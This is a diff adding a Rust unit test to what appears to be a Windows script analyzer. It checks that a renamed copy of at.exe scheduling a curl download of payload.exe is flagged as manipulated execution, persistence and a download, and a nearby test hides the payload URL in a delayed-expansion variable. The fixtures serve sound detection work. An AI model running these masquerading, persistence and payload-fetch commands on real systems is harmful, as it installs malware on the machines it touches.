@@ -40179,6 +40179,45 @@ mod at_scheduler_tests {
     }
 
     #[test]
+    fn copied_at_alias_scheduled_cmd_child_is_analyzed() {
+        let script = br#"copy C:\Windows\System32\at.exe C:\Users\Public\at.tmp
+C:\Users\Public\at.tmp 23:59 cmd.exe /c curl -o payload.exe https://copied-at.example/payload.exe"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target == r#"C:\Users\Public\at.tmp"#
+            )),
+            "copied at alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, value_name, command }
+                    if hive == "AtJob"
+                        && key == "23:59"
+                        && value_name == "command"
+                        && command == "cmd.exe /c curl -o payload.exe https://copied-at.example/payload.exe"
+            )),
+            "copied at scheduled command persistence missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-at.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied at scheduled child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn at_scheduled_quoted_cmd_child_is_analyzed() {
         let script = br#"at 23:59 "cmd.exe /V:ON /c set U=https://at-quoted.example/payload.exe&&curl -o payload.exe !U!""#;
         let report = analyze(script, &Config::default());
